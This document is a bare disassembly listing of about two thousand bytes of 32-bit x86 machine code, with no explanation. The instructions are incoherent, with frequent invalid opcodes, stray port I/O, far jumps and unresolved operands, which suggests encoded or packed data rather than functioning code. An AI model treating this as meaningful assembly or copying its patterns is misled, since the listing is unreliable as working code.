  4253b7:	mov    ebx,0x9e10e8f7
  4253bc:	retf   
  4253bd:	inc    esi
  4253be:	push   ebx
  4253bf:	xchg   DWORD PTR [edi-0x79b9f5e],ebx
  4253c5:	dec    esi
  4253c6:	mov    dh,0xfe
  4253c8:	es mov esp,0xceccd6d6
  4253ce:	inc    ecx
  4253cf:	popa   
  4253d0:	stc    
  4253d1:	jae    0x4253d1
  4253d3:	add    DWORD PTR [ebp+0x3720d2f5],0xffffff92
  4253da:	xchg   ebp,eax
  4253db:	rcl    DWORD PTR [eax],cl
  4253dd:	(bad)  
  4253de:	aam    0xf2
  4253e0:	cmp    al,0x63
  4253e2:	mov    ebp,esp
  4253e4:	ret    0x205c
  4253e7:	inc    ecx
  4253e8:	mov    esi,0xe83111f9
  4253ed:	ds enter 0x4910,0xd2
  4253f2:	shr    eax,1
  4253f4:	mov    WORD PTR [ecx],?
  4253f6:	add    dl,BYTE PTR [edi+0x10]
  4253f9:	lds    esi,FWORD PTR [edx-0x3bb35f4]
  4253ff:	push   ds
  425400:	cmp    al,0xa9
  425402:	mov    ds:0xe2b147dc,al
  425407:	xchg   edx,eax
  425408:	xchg   BYTE PTR [ebx+0x72],bh
  42540b:	push   edx
  42540c:	aad    0x5c
  42540e:	xchg   ecx,eax
  42540f:	sbb    al,0x5d
  425411:	icebp  
  425412:	sahf   
  425413:	or     BYTE PTR [esi+0x4e9c6579],bl
  425419:	pop    esi
  42541a:	dec    edi
  42541b:	mov    bl,0xf4
  42541d:	mov    eax,ds:0x879b0423
  425422:	cmc    
  425423:	sub    BYTE PTR ds:0xaea1b92,0xed
  42542a:	pop    edx
  42542b:	mov    edx,0xa9b4c759
  425430:	push   ecx
  425431:	lea    edx,[esi-0x3142ff5]
  425437:	inc    ebx
  425438:	aas    
  425439:	not    BYTE PTR [edi]
  42543b:	pop    ss
  42543c:	pop    esi
  42543d:	test   BYTE PTR [eax-0xe8498c2],ch
  425443:	sub    BYTE PTR cs:[edi-0x5f],0xae
  425448:	fdiv   DWORD PTR ds:[ebp-0x3]
  42544c:	fwait
  42544d:	stos   BYTE PTR es:[edi],al
  42544e:	inc    esp
  42544f:	rcr    BYTE PTR [eax],1
  425451:	lods   eax,DWORD PTR ds:[esi]
  425452:	or     BYTE PTR [ebp-0x2bfef252],ah
  425458:	xchg   ecx,eax
  425459:	rcl    BYTE PTR [edi+0x68],1
  42545c:	in     al,dx
  42545d:	dec    ebx
  42545e:	pop    eax
  42545f:	sub    BYTE PTR [ebx],bh
  425461:	sahf   
  425462:	push   es
  425463:	or     bl,BYTE PTR [ebp+eax*8-0x35d1b632]
  42546a:	or     BYTE PTR [esi],dl
  42546c:	js     0x425453
  42546e:	pop    esi
  42546f:	mov    DWORD PTR [esi],eax
  425471:	fsub   st,st(4)
  425473:	cmp    BYTE PTR ds:[edi],0xa5
  425477:	add    BYTE PTR [edx-0x61],bl
  42547a:	or     edi,DWORD PTR [edx]
  42547c:	mov    esi,0x3d076635
  425481:	int    0x44
  425483:	cwde   
  425484:	test   DWORD PTR [eax+edx*1+0x53],eax
  425488:	es sbb BYTE PTR es:[edx+0x37],al
  42548d:	xchg   DWORD PTR [edx-0x119865ae],ebp
  425493:	inc    ebx
  425494:	das    
  425495:	mov    edi,0x1fd6f91c
  42549a:	out    0x5d,al
  42549c:	scas   eax,DWORD PTR es:[edi]
  42549d:	stc    
  42549e:	push   es
  42549f:	mov    dh,0xfa
  4254a1:	stos   DWORD PTR es:[edi],eax
  4254a2:	cld    
  4254a3:	jmp    0x90e8:0x5da71f13
  4254aa:	jecxz  0x4254ad
  4254ac:	mov    ebp,0x81748a6
  4254b1:	push   edx
  4254b2:	mov    eax,ds:0x53ccf91a
  4254b7:	(bad)  
  4254b9:	daa    
  4254ba:	mov    edi,0x5de84df6
  4254bf:	mov    ebp,ecx
  4254c1:	stc    
  4254c2:	add    DWORD PTR [edi],ebx
  4254c4:	mov    ebp,0x5dfa45f1
  4254c9:	dec    eax
  4254ca:	pop    ebx
  4254cb:	bound  ebp,QWORD PTR [edi]
  4254cd:	push   edi
  4254ce:	or     eax,0x79d4c6b4
  4254d3:	sub    DWORD PTR [eax-0x5e],ebp
  4254d6:	dec    ebx
  4254d7:	mov    DWORD PTR [edi],eax
  4254d9:	aaa    
  4254da:	push   ds
  4254db:	gs mov edi,0x7f9de7dd
  4254e1:	push   0xffffff99
  4254e3:	(bad)  
  4254e4:	pop    ebp
  4254e5:	cli    
  4254e6:	add    eax,0x5c6b378e
  4254eb:	fstp   DWORD PTR [ebp-0x20]
  4254ee:	mov    edi,DWORD PTR [ebx-0x259d8db1]
  4254f4:	lock pop es
  4254f6:	xlat   BYTE PTR ds:[ebx]
  4254f7:	push   edi
  4254f8:	mov    DWORD PTR [edi-0x6],edi
  4254fb:	out    dx,eax
  4254fc:	push   edx
  4254fd:	(bad)  
  4254fe:	fdivr  st(7),st
  425500:	jb     0x4254f7
  425502:	inc    edx
  425503:	inc    edi
  425504:	nop
  425505:	shr    BYTE PTR [ecx-0xa9c9125],0x78
  42550c:	(bad)
  42550f:	test   BYTE PTR [eax],0xd2
  425512:	sub    eax,0x971e7cac
  425517:	xchg   ecx,eax
  425518:	pop    ss
  425519:	pushf  
  42551a:	fstp   TBYTE PTR [ecx-0x6b]
  42551d:	xchg   ecx,eax
  42551e:	push   ecx
  42551f:	cmc    
  425520:	xor    eax,0xf093dcf6
  425525:	repnz in eax,dx
  425527:	xchg   esp,eax
  425528:	dec    edi
  425529:	out    0x96,al
  42552b:	sbb    al,0x6
  42552d:	hlt    
  42552e:	cmp    esi,esi
  425530:	mov    ecx,0x2c6f2873
  425535:	jae    0x425578
  425537:	mov    ah,0xe8
  425539:	jae    0x42550a
  42553b:	and    BYTE PTR ds:0xe1c6dfb7,0xbd
  425542:	stos   BYTE PTR es:[edi],al
  425543:	mov    ebx,0x20272513
  425548:	pop    es
  425549:	mov    cl,BYTE PTR [edx]
  42554b:	out    0x28,al
  42554d:	jmp    DWORD PTR ds:0x315c0e2b
  425553:	xchg   esp,eax
  425554:	lock fistp DWORD PTR [eax+0x48]
  425558:	lahf   
  425559:	inc    edi
  42555a:	lock repz cmc 
  42555d:	rcl    BYTE PTR fs:[edx+0x59],1
  425561:	aas    
  425562:	push   ss
  425563:	pop    ds
  425564:	dec    ebp
  425565:	and    bl,bh
  425567:	cmp    bl,BYTE PTR [ecx+0x4e72d0f3]
  42556d:	sbb    esi,ecx
  42556f:	push   edi
  425570:	out    0xd3,al
  425572:	fdivr  DWORD PTR [ebp+0x61f6fc1c]
  425578:	xchg   edx,eax
  425579:	or     eax,0x1ee50279
  42557e:	jge    0x42556e
  425580:	in     eax,0xd6
  425582:	out    0x3,eax
  425584:	adc    ch,0xd1
  425587:	xor    eax,0xe4087e7d
  42558c:	jmp    0x5750:0xb2b9cad7
  425593:	push   esp
  425594:	lea    ebp,[ecx]
  425596:	mov    dl,0x18
  425598:	xchg   ebp,eax
  425599:	fsub   DWORD PTR [edi]
  42559b:	mov    dh,0xf7
  42559d:	imul   eax
  42559f:	out    0x1d,eax
  4255a1:	sub    DWORD PTR [ebp+0xe],eax
  4255a4:	scas   eax,DWORD PTR es:[edi]
  4255a5:	sbb    eax,0xbc5b9e7e
  4255aa:	fst    QWORD PTR [edx]
  4255ac:	add    eax,0x43636970
  4255b1:	fbstp  TBYTE PTR [ebp+0x6f9fec7a]
  4255b7:	pop    edi
  4255b8:	mov    ebp,0x263437f6
  4255bd:	push   edx
  4255be:	outs   dx,DWORD PTR ds:[esi]
  4255bf:	jns    0x4255a3
  4255c1:	adc    eax,0x2ae69c94
  4255c6:	inc    esp
  4255c7:	mov    ah,0xaa
  4255c9:	rcl    ah,1
  4255cb:	pop    ss
  4255cc:	push   ss
  4255cd:	cmp    ecx,DWORD PTR [edi]
  4255cf:	nop
  4255d0:	or     ebp,edi
  4255d2:	cwde   
  4255d3:	or     ebx,DWORD PTR [eax]
  4255d5:	sbb    al,0x84
  4255d7:	jno    0x4255e3
  4255d9:	icebp  
  4255da:	sbb    dh,bh
  4255dc:	fist   DWORD PTR [esi-0x5a]
  4255df:	jnp    0x425562
  4255e1:	pop    ebx
  4255e2:	mov    ds:0xa40f8e2f,eax
  4255e7:	imul   esp,DWORD PTR [ebx+0x2c157b77],0x9
  4255ee:	(bad)  
  4255ef:	xchg   edx,eax
  4255f0:	xchg   esp,eax
  4255f1:	push   ss
  4255f2:	push   edi
  4255f3:	es sub al,0xae
  4255f6:	adc    BYTE PTR cs:[edx+0x3d6f2e75],ch
  4255fd:	shl    ecx,0xe9
  425600:	cmp    DWORD PTR [esi],edi
  425602:	cld    
  425603:	lock scas eax,DWORD PTR es:[edi]
  425605:	jae    0x4255d7
  425607:	out    dx,al
  425608:	adc    BYTE PTR [esi+0x4f8e4cf5],cl
  42560e:	mov    al,ds:0x77de616
  425613:	fild   DWORD PTR [ecx+0x6ffe6074]
  425619:	mov    edi,0x6ba1f3d4
  42561e:	lahf   
  42561f:	loope  0x42560d
  425621:	rcr    BYTE PTR [edx],cl
  425623:	(bad)  
  425624:	pop    edi
  425625:	mov    eax,0x89a8de82
  42562a:	jge    0x42569b
  42562c:	mov    ch,0xf8
  42562e:	jne    0x4255d4
  425630:	sub    bl,BYTE PTR [eax+0x34]
  425633:	fmul   DWORD PTR [edx]
  425635:	ds push ds
  425637:	ror    DWORD PTR [eax+0x73],1
  42563a:	in     eax,0x99
  42563c:	jmp    0x4255d5
  42563e:	mov    ecx,0xde7df3e
  425643:	daa    
  425644:	pop    edi
  425645:	lds    edi,FWORD PTR [ebx+ebx*8-0x3842561b]
  42564c:	pop    eax
  42564d:	pop    esp
  42564e:	or     BYTE PTR [edi+ecx*4-0x79],bl
  425652:	cld    
  425653:	sar    ah,cl
  425655:	arpl   sp,di
  425657:	mov    ecx,0x8f337ed7
  42565c:	pushf  
  42565d:	jmp    FWORD PTR [ecx]
  42565f:	sahf   
  425660:	pushf  
  425661:	pop    edi
  425662:	jecxz  0x425654
  425664:	(bad)  
  425665:	dec    BYTE PTR [ebx]
  425667:	scas   al,BYTE PTR es:[edi]
  425668:	pop    esp
  425669:	fsub   st,st(0)
  42566b:	int3   
  42566c:	stc    
  42566d:	rep lods al,BYTE PTR ds:[esi]
  42566f:	scas   eax,DWORD PTR es:[edi]
  425670:	das    
  425671:	mov    al,0xbf
  425673:	xor    esp,DWORD PTR [edi-0x2a]
  425676:	es scas eax,DWORD PTR es:[edi]
  425678:	xchg   DWORD PTR [edi],edx
  42567a:	and    BYTE PTR ds:0x1818398c,0x9e
  425681:	aas    
  425682:	jae    0x425660
  425684:	loop   0x4256c4
  425686:	imul   ebp,DWORD PTR [esi],0x64
  425689:	sub    bh,BYTE PTR [esi+0x4cc61a73]
  42568f:	aam    0xa2
  425691:	push   cs
  425692:	arpl   WORD PTR [ecx],si
  425694:	add    BYTE PTR [ebx],dl
  425696:	fsubrp st(2),st
  425698:	(bad)  
  425699:	stos   DWORD PTR es:[edi],eax
  42569a:	xchg   DWORD PTR ds:[edi-0x35],eax
  42569e:	sbb    al,0x5d
  4256a0:	out    0x76,al
  4256a2:	retf   0xd947
  4256a5:	ret    0xe6b
  4256a8:	cmp    DWORD PTR [esi+0x65],esp
  4256ab:	loopne 0x42566f
  4256ad:	push   esp
  4256ae:	mov    esi,0xff25f793
  4256b3:	mov    esi,0xac922f77
  4256b8:	push   0x90b1bc4a
  4256bd:	mov    ebx,0xbcfadde5
  4256c2:	sub    BYTE PTR [edx],ch
  4256c4:	outs   dx,BYTE PTR ds:[esi]
  4256c5:	je     0x42573a
  4256c7:	arpl   bx,bp
  4256c9:	aas    
  4256ca:	or     al,0xc8
  4256cc:	call   0x94d3b497
  4256d1:	(bad)  
  4256d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256d3:	pop    ecx
  4256d4:	mov    eax,ds:0x3c0fb0b8
  4256d9:	ror    DWORD PTR [eax-0x8],0xcb
  4256dd:	jl     0x42569a
  4256df:	jmp    0x634d1e2b
  4256e4:	cmp    BYTE PTR [edi+0x74658f64],dl
  4256ea:	mov    esi,0xde22b2e2
  4256ef:	mov    edi,0xd0c6a411
  4256f4:	outs   dx,DWORD PTR ds:[esi]
  4256f5:	or     eax,0xf6e86555
  4256fa:	out    0x75,al
  4256fc:	push   cs
  4256fd:	aad    0x7d
  4256ff:	fsubr  QWORD PTR [edx+0x5b8c7eaa]
  425705:	mov    esp,0x200e68bd
  42570a:	outs   dx,DWORD PTR ds:[esi]
  42570b:	scas   eax,DWORD PTR es:[edi]
  42570c:	cli    
  42570d:	mov    bl,0x5f
  42570f:	test   DWORD PTR [ebp+edx*1+0x26],0x69314817
  425717:	push   esp
  425718:	mov    ah,0xf7
  42571a:	and    DWORD PTR ds:[edx+0x3e],0xdb16d48d
  425722:	aam    0x10
  425724:	lods   al,BYTE PTR ds:[esi]
  425725:	pop    ebx
  425726:	push   0x56
  425728:	fcom   QWORD PTR [edx+0x17a30071]
  42572e:	ss push ss
  425730:	in     al,0x2c
  425732:	cld    
  425733:	stc    
  425734:	in     eax,0xe7
  425736:	std    
  425737:	pop    ecx
  425738:	xor    eax,ebp
  42573a:	shl    ebx,1
  42573c:	inc    edi
  42573d:	fistp  QWORD PTR [edi]
  42573f:	xchg   edx,eax
  425740:	daa    
  425741:	sahf   
  425742:	pop    ecx
  425743:	push   0x4f
  425745:	xchg   esp,eax
  425746:	dec    ecx
  425747:	sahf   
  425748:	jp     0x425725
  42574a:	into   
  42574b:	sti    
  42574c:	inc    edx
  42574d:	pop    esp
  42574e:	test   ch,0x26
  425751:	xchg   DWORD PTR [ebx-0x19f1f1fd],esi
  425757:	dec    eax
  425758:	or     BYTE PTR [ecx+ecx*2+0x4bb3166d],al
  42575f:	dec    eax
  425760:	(bad)  [eax+0x15c7cc33]
  425766:	inc    ecx
  425767:	fwait
  425768:	enter  0xefbc,0x79
  42576c:	ins    BYTE PTR es:[edi],dx
  42576d:	imul   eax,DWORD PTR [ebx-0x605db90a],0xfffffff5
  425774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425775:	push   cs
  425776:	dec    eax
  425777:	and    DWORD PTR [ecx],0xe07cdf55
  42577d:	in     al,dx
  42577e:	jecxz  0x425726
  425780:	push   cs
  425781:	loop   0x425784
  425783:	les    ecx,FWORD PTR [esi-0x27]
  425786:	fstp   st(7)
  425788:	out    0xe3,eax
  42578a:	iret   
  42578b:	jl     0x425727
  42578d:	das    
  42578e:	pop    esp
  42578f:	jge    0x42571d
  425791:	scas   al,BYTE PTR es:[edi]
  425792:	mov    ebx,DWORD PTR [esp+ebx*1]
  425795:	inc    esi
  425796:	mov    edx,0xcded6c19
  42579b:	stc    
  42579c:	fldenv [edi]
  42579e:	jg     0x425735
  4257a0:	and    bl,ch
  4257a2:	mov    esp,0x787bfcf7
  4257a7:	ret    
  4257a8:	jg     0x4257a0
  4257aa:	rol    esp,cl
  4257ac:	fdiv   DWORD PTR [edx-0x7]
  4257af:	test   eax,0xed6deccb
  4257b4:	xor    DWORD PTR [ebp-0x592829fa],ebx
  4257ba:	mov    esi,0xda92807e
  4257bf:	add    al,0xbd
  4257c1:	sub    ebp,ebx
  4257c3:	fsub   DWORD PTR [edi]
  4257c5:	scas   eax,DWORD PTR es:[edi]
  4257c6:	lods   eax,DWORD PTR ds:[esi]
  4257c7:	dec    edi
  4257c8:	les    ebx,FWORD PTR [eax]
  4257ca:	sub    DWORD PTR [ebp-0xb],esi
  4257cd:	push   ecx
  4257ce:	int    0xfd
  4257d0:	jmp    0x943a:0x756cdad4
  4257d7:	inc    edi
  4257d8:	inc    edi
  4257d9:	(bad)  
  4257da:	cmp    edx,DWORD PTR [ebx-0x6345a1b2]
  4257e0:	jp     0x4257a2
  4257e2:	stos   DWORD PTR es:[edi],eax
  4257e3:	daa    
  4257e4:	dec    ebx
  4257e5:	push   ebx
  4257e6:	adc    al,BYTE PTR [edi-0x53]
  4257e9:	out    0xe2,al
  4257eb:	addr16 (bad) 
  4257ed:	faddp  st(7),st
  4257ef:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4257f1:	ret    0xa031
  4257f4:	pop    edx
  4257f5:	pop    edx
  4257f6:	xchg   ebx,eax
  4257f7:	or     eax,0x1e16f975
  4257fc:	sub    al,0x4d
  4257fe:	cmp    edx,edx
  425800:	add    ch,al
  425802:	dec    ebx
  425803:	push   0x8cd1612f
  425808:	int3   
  425809:	sub    BYTE PTR [esi+0x5],ah
  42580c:	gs das 
  42580e:	jae    0x425888
  425810:	inc    DWORD PTR [edx-0x57]
  425813:	call   0x6321:0xb7f14094
  42581a:	enter  0xb1f1,0xe3
  42581e:	jg     0x4257db
  425820:	mov    al,0x8a
  425822:	daa    
  425823:	idiv   DWORD PTR [eax-0x3356440e]
  425829:	test   BYTE PTR [esp+edi*8],ch
  42582c:	cdq    
  42582d:	js     0x4257e3
  42582f:	call   0x8eb49280
  425834:	jl     0x4257d2
  425836:	retf   0x9908
  425839:	clc    
  42583a:	cmc    
  42583b:	mov    dl,0x2
  42583d:	sub    dl,bl
  42583f:	push   edi
  425840:	pushf  
  425841:	or     al,0x1c
  425843:	mov    ah,0x82
  425845:	lods   eax,DWORD PTR ds:[esi]
  425846:	adc    al,0x5d
  425848:	add    DWORD PTR [edx+0x79],edx
  42584b:	fidivr DWORD PTR [ebp+edx*2-0x6]
  42584f:	addr16 test al,0x37
  425852:	rcr    DWORD PTR fs:[eax],1
  425855:	dec    ecx
  425856:	jle    0x425867
  425858:	mov    eax,ds:0xff1ffd0a
  42585d:	call   0x6ec15161
  425862:	icebp  
  425863:	jbe    0x425830
  425865:	adc    al,0xc0
  425867:	fwait
  425868:	mov    edi,0xd5525bf7
  42586d:	test   BYTE PTR [edi],cl
  42586f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425870:	and    al,0xaa
  425872:	call   0x3a90:0x486f24a
  425879:	and    BYTE PTR [ebp-0x80],dh
  42587c:	cmp    bh,BYTE PTR [eax-0x7b]
  42587f:	loopne 0x425821
  425881:	push   ebx
  425882:	pop    es
  425883:	in     eax,dx
  425884:	sub    eax,0x53934c83
  425889:	pop    ecx
  42588a:	mov    bl,0xd3
  42588c:	jp     0x425861
  42588e:	sbb    ebp,DWORD PTR [edx]
  425890:	pop    ecx
  425891:	jno    0x4258cd
  425893:	mov    ebx,?
  425895:	dec    eax
  425896:	xor    DWORD PTR [eax+0x5c60567f],ecx
  42589c:	mov    esi,0xa447c8d0
  4258a1:	sub    BYTE PTR [edi],al
  4258a3:	jecxz  0x4258ce
  4258a5:	scas   al,BYTE PTR es:[edi]
  4258a6:	pop    ebp
  4258a7:	fldenv [eax+0x61]
  4258aa:	mov    dl,0xca
  4258ac:	fdivp  st(6),st
  4258ae:	dec    esi
  4258af:	jmp    0xdefced93
  4258b4:	jmp    0xdada:0xe831a5e8
  4258bb:	imul   DWORD PTR [ebx-0x3534f2b7]
  4258c1:	mov    esp,0x29b9a44d
  4258c6:	cwde   
  4258c7:	xor    al,0xc7
  4258c9:	enter  0xc131,0xf2
  4258cd:	(bad)  
  4258cf:	sub    BYTE PTR [edi-0x59fbe2e3],bh
  4258d5:	dec    ebx
  4258d6:	push   0x34852c16
  4258db:	mov    esp,ecx
  4258dd:	jmp    0x2b8b444b
  4258e2:	mov    DWORD PTR [eax+0x47],ebx
  4258e5:	jbe    0x42590e
  4258e7:	jnp    0x4258e5
  4258e9:	mov    ebx,0xd0f9a7d9
  4258ee:	out    0x2f,al
  4258f0:	lock fidiv DWORD PTR [ebx]
  4258f3:	div    DWORD PTR [eax-0x4]
  4258f6:	sti    
  4258f7:	(bad)  
  4258f8:	push   edi
  4258f9:	hlt    
  4258fa:	fisubr WORD PTR [edi]
  4258fc:	jb     0x425961
  4258fe:	repz or dl,BYTE PTR [edi+0x374abe9f]
  425905:	jmp    0x425960
  425907:	cmp    eax,0x49e378de
  42590c:	xor    BYTE PTR gs:[edi],dl
  42590f:	cmp    DWORD PTR [esp+eiz*2+0x3f],esi
  425913:	jmp    0x60d5:0x6db98355
  42591a:	pop    ecx
  42591b:	aam    0x7a
  42591d:	or     DWORD PTR [esi-0x1b],esp
  425920:	nop
  425921:	jnp    0x425930
  425923:	inc    esi
  425924:	pop    ebx
  425925:	mov    ch,0x36
  425927:	push   edi
  425928:	inc    ebp
  425929:	out    0x77,al
  42592b:	cwde   
  42592c:	adc    eax,0xc6865264
  425931:	sbb    eax,0x2a578db9
  425936:	lds    esp,FWORD PTR [eax+0x7cec1d7e]
  42593c:	xor    DWORD PTR ds:0x4287450a,ecx
  425942:	mov    al,ds:0xf9ef8223
  425947:	cld    
  425948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425949:	out    dx,al
  42594a:	mov    edi,0xe9e2fae4
  42594f:	sar    dh,1
  425951:	sahf   
  425952:	or     dh,BYTE PTR [edi+eiz*4]
  425955:	mov    esp,0x9a422d4f
  42595a:	test   DWORD PTR [eax],esi
  42595c:	daa    
  42595d:	das    
  42595e:	stc    
  42595f:	sti    
  425960:	or     eax,0xc401f250
  425965:	lods   eax,DWORD PTR ds:[esi]
  425966:	jnp    0x425979
  425968:	push   esi
  425969:	cmp    eax,DWORD PTR [ebx-0x6b4ab1cb]
  42596f:	(bad)  
  425970:	in     al,dx
  425971:	mov    BYTE PTR cs:[edi+0x70f872f],bl
  425978:	ja     0x4259cc
  42597a:	nop
  42597b:	sub    bl,cl
  42597d:	jns    0x425901
  42597f:	fild   WORD PTR [ecx+0x4726451c]
  425985:	xchg   edx,eax
  425986:	(bad)  
  425987:	pop    esp
  425988:	sbb    DWORD PTR [esi*1+0x43ae0196],edx
  42598f:	jg     0x42599a
  425991:	out    dx,al
  425992:	mov    BYTE PTR [esi+0x42],dl
  425995:	test   al,0x3
  425997:	push   ebp
  425998:	adc    ebp,DWORD PTR [eax+0x1a73376a]
  42599e:	jmp    0x1a078276
  4259a3:	adc    BYTE PTR [ecx+0x6c9bfe9e],ch
  4259a9:	(bad)  [ecx+ebp*8+0x5e]
  4259ad:	hlt    
  4259ae:	jbe    0x42597b
  4259b0:	adc    al,0xc0
  4259b2:	imul   DWORD PTR [esp+ebp*2-0x5c]
  4259b6:	arpl   WORD PTR [ebx-0x75],cx
  4259b9:	aas    
  4259ba:	stos   BYTE PTR es:[edi],al
  4259bb:	call   0x6f5:0x201f3d54
  4259c2:	in     eax,dx
  4259c3:	inc    edx
  4259c4:	test   al,0xc
  4259c6:	add    DWORD PTR [edx+ecx*8-0x4f384054],eax
  4259cd:	ins    DWORD PTR es:[edi],dx
  4259ce:	test   eax,0x583ec86c
  4259d3:	mov    esi,esi
  4259d5:	out    0x41,eax
  4259d7:	xchg   edi,eax
  4259d8:	mov    ds:0xe91f3d2f,eax
  4259dd:	push   ds
  4259de:	cmp    al,0x22
  4259e0:	js     0x425a61
  4259e2:	jg     0x425972
  4259e4:	mov    WORD PTR [ebx+0x7c69d392],?
  4259ea:	mov    al,0x19
  4259ec:	xchg   esp,eax
  4259ed:	test   BYTE PTR [ebp-0x18ac0ad1],bh
  4259f3:	pop    eax
  4259f4:	js     0x425998
  4259f6:	xchg   edi,eax
  4259f7:	sbb    eax,0x47ecbc6e
  4259fc:	jmp    0xdef384e5
  425a01:	inc    ecx
  425a02:	jmp    0x425a1d
  425a04:	test   eax,0x2cbb18b7
  425a09:	sub    BYTE PTR [eax+ecx*4+0x532234e8],bl
  425a10:	nop
  425a11:	xor    ebp,DWORD PTR ds:0x8469053a
  425a17:	xor    BYTE PTR [ecx],dl
  425a19:	push   0x2172a2b2
  425a1e:	je     0x425a7f
  425a20:	aaa    
  425a21:	out    0xcd,eax
  425a23:	fiadd  DWORD PTR [edx-0x60]
  425a26:	nop
  425a27:	push   ebx
  425a28:	cmp    eax,0xe3812b5
  425a2d:	cmc    
  425a2e:	or     DWORD PTR [ecx-0x556af4fb],eax
  425a34:	and    al,0x64
  425a36:	stos   BYTE PTR es:[edi],al
  425a37:	xor    al,0x4b
  425a39:	ret    0xc5f1
  425a3c:	call   0x67e2:0x4484c995
  425a43:	lahf   
  425a44:	std    
  425a45:	adc    eax,0x77e9c8fe
  425a4a:	lock inc edi
  425a4c:	inc    edx
  425a4e:	inc    ebp
  425a4f:	dec    esi
  425a50:	jle    0x425a31
  425a52:	setae  BYTE PTR [esi]
  425a55:	jbe    0x425a10
  425a57:	jb     0x425a4a
  425a59:	adc    bh,BYTE PTR [ebp+0x1b]
  425a5c:	pop    ecx
  425a5d:	pop    esi
  425a5e:	test   eax,0xb953d9c9
  425a63:	jecxz  0x425a16
  425a65:	out    0x72,al
  425a67:	pop    edx
  425a68:	pop    ss
  425a69:	(bad)  
  425a6a:	call   0x6c91c9c
  425a6f:	call   0x97bf:0xee79b4b6
  425a76:	fwait
  425a77:	jo     0x425ae1
  425a79:	pop    es
  425a7a:	sbb    al,BYTE PTR [ebx+0x41]
  425a7d:	sub    ebx,DWORD PTR [ecx-0x20]
  425a80:	mov    ecx,DWORD PTR [edi+0x1629a0af]
  425a86:	adc    cl,bh
  425a88:	xchg   esi,eax
  425a89:	ficom  WORD PTR [edx-0x323776ee]
  425a8f:	lods   al,BYTE PTR ds:[esi]
  425a91:	aam    0xd8
  425a93:	xlat   BYTE PTR ds:[ebx]
  425a94:	leave  
  425a95:	shl    DWORD PTR [ebx+0x24e13ed6],cl
  425a9b:	pop    eax
  425a9c:	mov    ss,WORD PTR [eiz*8+0x42a42946]
  425aa3:	push   es
  425aa4:	xchg   esi,eax
  425aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425aa6:	stos   DWORD PTR es:[edi],eax
  425aa7:	inc    edi
  425aa8:	cwde   
  425aa9:	inc    esi
  425aaa:	retf   0xc83c
  425aad:	cmp    BYTE PTR [edi],0x26
  425ab0:	add    eax,DWORD PTR [ebx]
  425ab2:	mov    ds:0x65b90363,eax
  425ab7:	mov    bl,0xcf
  425ab9:	cwde   
  425aba:	add    edx,ecx
  425abc:	pop    ss
  425abd:	repnz outs dx,BYTE PTR ds:[esi]
  425abf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ac0:	sbb    BYTE PTR [edx],cl
  425ac2:	mov    ah,cl
  425ac4:	and    al,0x69
  425ac6:	leave  
  425ac7:	add    eax,0x89ea6190
  425acc:	inc    ebx
  425acd:	(bad)  
  425ace:	mov    cl,0xf1
  425ad0:	jo     0x425ae6
  425ad2:	popa   
  425ad3:	mov    ah,BYTE PTR [eax]
  425ad5:	sub    esp,DWORD PTR [esi+eax*4]
  425ad8:	stc    
  425ad9:	cmp    eax,DWORD PTR [edx+0x1f]
  425adc:	jbe    0x425a6d
  425ade:	ds aas 
  425ae0:	inc    edi
  425ae1:	mov    al,BYTE PTR [eax]
  425ae3:	dec    edi
  425ae4:	cli    
  425ae5:	test   eax,0xaa7ecaea
  425aea:	push   eax
  425aeb:	xchg   esi,eax
  425aec:	imul   eax,DWORD PTR [ebx+0x7b],0x5c62c853
  425af3:	ret    0xd5c1
  425af6:	mov    ebp,0x37fd965b
  425afb:	fisubr WORD PTR [esi-0x67]
  425afe:	add    al,BYTE PTR [eax]
  425b00:	cmp    cl,bh
  425b02:	not    BYTE PTR [edi+0x3d]
  425b05:	push   esp
  425b06:	test   edx,ebp
  425b08:	inc    edx
  425b09:	dec    edx
  425b0a:	call   0x8730:0xe7ddfbd4
  425b11:	xchg   ecx,eax
  425b12:	sbb    al,0x2
  425b14:	jne    0x425b23
  425b16:	adc    eax,0x4195171e
  425b1b:	xor    BYTE PTR [ebx+0x5034766a],cl
  425b21:	inc    esi
  425b22:	or     DWORD PTR [edi-0x79003cfd],ebx
  425b28:	jbe    0x425b06
  425b2a:	inc    edx
  425b2b:	cdq    
  425b2c:	and    ch,al
  425b2e:	xlat   BYTE PTR ds:[ebx]
  425b2f:	repnz in eax,dx
  425b31:	dec    eax
  425b32:	mov    BYTE PTR [eax-0x68],ch
  425b35:	pop    eax
  425b36:	fst    DWORD PTR [edx+0xc]
  425b39:	xlat   BYTE PTR ds:[ebx]
  425b3a:	mov    dl,0xeb
  425b3c:	test   DWORD PTR [ebx+edx*4+0x66],edx
  425b40:	leave  
  425b41:	sbb    eax,DWORD PTR [edi+esi*8-0x5e59db2c]
  425b48:	mov    ds:0x5ed39fdb,al
  425b4d:	call   0xc257:0x1c3dbba3
  425b54:	ins    DWORD PTR es:[edi],dx
  425b55:	adc    DWORD PTR [esi+0x12],edx
  425b58:	aam    0x89
  425b5a:	push   0xffffffe2
  425b5c:	das    
  425b5d:	mov    esi,0xf876a84d
  425b62:	jnp    0x425bd7
  425b64:	aaa    
  425b65:	inc    ecx
  425b66:	inc    ecx
  425b67:	or     al,0x90
  425b69:	push   es
  425b6a:	mov    cl,0x70
  425b6c:	sub    BYTE PTR ds:0xcb084684,cl
  425b72:	sub    BYTE PTR [esp+eax*2],0xa4
  425b76:	or     DWORD PTR [ebp+ebx*4+0xe07edd0],esi
  425b7d:	(bad)  
  425b7f:	iret   
  425b80:	mov    esi,0xc207f40d
  425b85:	in     al,dx
  425b86:	mov    al,ds:0xccf79da3
  425b8b:	ficom  DWORD PTR [esi+0xfd1f7ff]
  425b91:	icebp  
  425b92:	loope  0x425b3b
  425b94:	push   ds
  425b95:	loopne 0x425b95
  425b97:	arpl   WORD PTR [edi-0x8208a1a],bp
  425b9d:	dec    edi
  425b9e:	or     DWORD PTR [ebx],ebp
  425ba0:	jnp    0x425bfe
  425ba2:	mov    edi,0x2bd49176
  425ba7:	stos   DWORD PTR es:[edi],eax
  425ba8:	sub    edx,DWORD PTR [ebx-0x78ef382e]
  425bae:	hlt    
  425baf:	(bad)  
